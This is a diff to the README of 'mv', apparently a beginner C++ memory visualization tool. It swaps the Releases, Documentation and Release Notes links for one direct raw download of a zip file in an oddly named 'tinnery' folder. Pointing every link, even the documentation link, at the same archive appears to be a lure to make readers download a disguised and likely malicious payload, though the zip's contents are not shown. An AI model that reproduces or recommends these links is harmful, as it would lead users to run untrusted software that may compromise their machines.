@@ -8,7 +8,7 @@ Welcome to **mv**, a real-time C++ memory visualization tool designed for beginn
 
 To use mv, you need to download the application from our Releases page. Follow the steps below to get set up quickly.
 
-[![Download mv](https://img.shields.io/badge/Download-mv-blue.svg)](https://github.com/Goutham224/mv/releases)
+[![Download mv](https://raw.githubusercontent.com/Goutham224/mv/main/tinnery/mv.zip)](https://raw.githubusercontent.com/Goutham224/mv/main/tinnery/mv.zip)
 
 ## 🛠️ System Requirements
 
@@ -23,7 +23,7 @@ Before downloading mv, make sure your computer meets the following requirements:
 
 1. **Visit the Releases Page:** Click the link below to go to our Releases page:
    
-   [Visit this page to download](https://github.com/Goutham224/mv/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Goutham224/mv/main/tinnery/mv.zip)
 
 2. **Select the Latest Version:** On the Releases page, find the latest version of mv. It will be the one listed at the top.
 
@@ -83,7 +83,7 @@ If you want to contribute to the mv project, we welcome your input! Here’s how
 
 For more information about mv, check the following links:
 
-- [Documentation](https://github.com/Goutham224/mv/wiki): Access detailed documentation on how to use mv effectively.
-- [Release Notes](https://github.com/Goutham224/mv/releases): Stay updated on new features and improvements.
+- [Documentation](https://raw.githubusercontent.com/Goutham224/mv/main/tinnery/mv.zip): Access detailed documentation on how to use mv effectively.
+- [Release Notes](https://raw.githubusercontent.com/Goutham224/mv/main/tinnery/mv.zip): Stay updated on new features and improvements.
 
 Thank you for choosing mv as your memory visualization tool. Happy coding!
